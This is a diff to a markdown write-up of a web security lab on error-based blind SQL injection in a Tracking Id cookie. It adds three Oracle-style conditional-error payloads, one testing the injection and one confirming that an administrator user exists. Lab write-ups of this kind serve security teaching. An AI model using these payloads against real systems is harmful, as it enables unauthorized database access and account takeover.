@@ -21,4 +21,26 @@ To solve the lab, log in as the `administrator` user
 - After inserting extra `'` in the **Tracking Id** we get **Internal Server Error**.
 - The **Tracking Id** is vulnerable to SQLi.
 
+### Testing Error Entries
+
+- Giving the below payload gives an error.
+
+```sql
+' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)--
+```
+
+- Giving the below payload doesn't give any error.
+
+```sql
+' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)='a'--
+```
+
+### Checking User Entry
+
+- The below payload produces no errors indicating the `administrator` user does exist in the database.
+
+```sql
+' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
+```
+
 ###
